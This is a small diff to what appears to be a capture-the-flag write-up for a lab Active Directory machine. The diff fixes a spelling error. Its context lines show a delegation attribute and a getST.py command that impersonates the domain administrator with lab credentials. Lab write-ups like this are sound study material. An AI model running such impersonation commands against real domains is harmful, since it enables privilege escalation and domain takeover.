@@ -323,7 +323,7 @@ msds-allowedtoactonbehalfofotheridentity
 ----------------------------------------
 {1, 0, 4, 128...}
 ```
-Get the kerbers ticket
+Get the kerberos ticket
 ```
 getST.py -dc-ip 10.10.11.174 -spn www/dc.support.htb -impersonate administrator 'support.htb/user911:password@1'
 ```
